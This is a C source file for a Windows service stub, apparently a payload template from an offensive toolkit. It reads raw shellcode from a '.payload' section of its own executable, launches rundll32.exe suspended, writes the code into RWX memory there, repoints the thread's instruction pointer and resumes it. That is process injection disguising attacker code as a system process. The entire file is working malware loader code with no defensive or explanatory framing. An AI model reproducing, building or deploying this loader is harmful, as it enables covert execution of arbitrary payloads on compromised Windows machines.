#define WIN32_LEAN_AND_MEAN
#include <windows.h>

char cServiceName[32] = "SERVICENAME";

char cPayloadSection[8] = ".payload";

SERVICE_STATUS ss;

SERVICE_STATUS_HANDLE hStatus = NULL;

#if BUILDMODE == 2
/* hand-rolled bzero allows us to avoid including ms vc runtime */
void inline_bzero(void *p, size_t l)
{
	BYTE *q = (BYTE *)p;
	size_t x = 0;
	for (x = 0; x < l; x++)
		*(q++) = 0x00;
}

#endif

BOOL SectionNameIsPayload(BYTE *pSectionName)
{
	DWORD dwIndex = 0;
	for (dwIndex = 0; dwIndex < IMAGE_SIZEOF_SHORT_NAME; dwIndex++)
	{
		if (pSectionName[dwIndex] != ((BYTE *)cPayloadSection)[dwIndex])
			return FALSE;
	}

	return TRUE;
}

BOOL GetPayload(LPVOID *pPayload, DWORD *pdwPayloadSize)
{
	BYTE *pBase = NULL;
	BYTE *pSectionData = NULL;
	DWORD dwIndex = 0;
	DWORD dwSectionSize = 0;
	PIMAGE_DOS_HEADER pDosHeader = NULL;
	PIMAGE_NT_HEADERS pNtHeaders = NULL;
	PIMAGE_SECTION_HEADER pSectionHeader = NULL;

	pBase = (BYTE *)GetModuleHandleA(NULL);
	if (!pBase)
		return FALSE;

	pDosHeader = (PIMAGE_DOS_HEADER)pBase;
	if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE)
		return FALSE;

	pNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pDosHeader->e_lfanew);
	if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE)
		return FALSE;

	pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);

	for (dwIndex = 0; dwIndex < pNtHeaders->FileHeader.NumberOfSections; dwIndex++)
	{
		if (SectionNameIsPayload(pSectionHeader[dwIndex].Name))
		{
			dwSectionSize = pSectionHeader[dwIndex].Misc.VirtualSize;
			if (!dwSectionSize)
				return FALSE;

			pSectionData = pBase + pSectionHeader[dwIndex].VirtualAddress;
			*pPayload = pSectionData;
			*pdwPayloadSize = dwSectionSize;
			return TRUE;
		}
	}

	return FALSE;
}

/*
 *
 */
BOOL ServiceHandler( DWORD dwControl )
{
	if( dwControl == SERVICE_CONTROL_STOP || dwControl == SERVICE_CONTROL_SHUTDOWN )
	{
		ss.dwWin32ExitCode = 0;
		ss.dwCurrentState  = SERVICE_STOPPED;
	}
	return SetServiceStatus( hStatus, &ss );
}

/*
 *
 */
VOID ServiceMain( DWORD dwNumServicesArgs, LPSTR * lpServiceArgVectors )
{
	CONTEXT Context;
	STARTUPINFO si;
	PROCESS_INFORMATION pi;
	LPVOID lpPayload = NULL;
	LPVOID lpPayloadData = NULL;
	DWORD dwPayloadSize = 0;

	inline_bzero( &ss, sizeof(SERVICE_STATUS) );
	inline_bzero( &si, sizeof(STARTUPINFO) );
	inline_bzero( &pi, sizeof(PROCESS_INFORMATION) );

	si.cb = sizeof(STARTUPINFO);

	ss.dwServiceType = SERVICE_WIN32_SHARE_PROCESS;

	ss.dwCurrentState = SERVICE_START_PENDING;

	ss.dwControlsAccepted = SERVICE_ACCEPT_STOP|SERVICE_ACCEPT_SHUTDOWN;

	hStatus = RegisterServiceCtrlHandler( (LPCSTR)&cServiceName, (LPHANDLER_FUNCTION)ServiceHandler );

	if ( hStatus )
	{
		ss.dwCurrentState = SERVICE_RUNNING;

		SetServiceStatus( hStatus, &ss );

		if( GetPayload( &lpPayloadData, &dwPayloadSize ) && CreateProcess( NULL, "rundll32.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi ) )
		{
			Context.ContextFlags = CONTEXT_FULL;

			GetThreadContext( pi.hThread, &Context );

			lpPayload = VirtualAllocEx( pi.hProcess, NULL, dwPayloadSize, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE );
			if( lpPayload )
			{
				WriteProcessMemory( pi.hProcess, lpPayload, lpPayloadData, dwPayloadSize, NULL );
#ifdef _WIN64
				Context.Rip = (ULONG_PTR)lpPayload;
#else
				Context.Eip = (ULONG_PTR)lpPayload;
#endif
				SetThreadContext( pi.hThread, &Context );
			}

			ResumeThread( pi.hThread );

			CloseHandle( pi.hThread );

			CloseHandle( pi.hProcess );
		}

		ServiceHandler( SERVICE_CONTROL_STOP );

		ExitProcess( 0 );
	}
}

/*
 *
 */
void main()
{
	SERVICE_TABLE_ENTRY st[] =
		{
			{ (LPSTR)&cServiceName, (LPSERVICE_MAIN_FUNCTIONA)&ServiceMain },
			{ NULL, NULL }
		};
	StartServiceCtrlDispatcher( (SERVICE_TABLE_ENTRY *)&st );
	return;
}
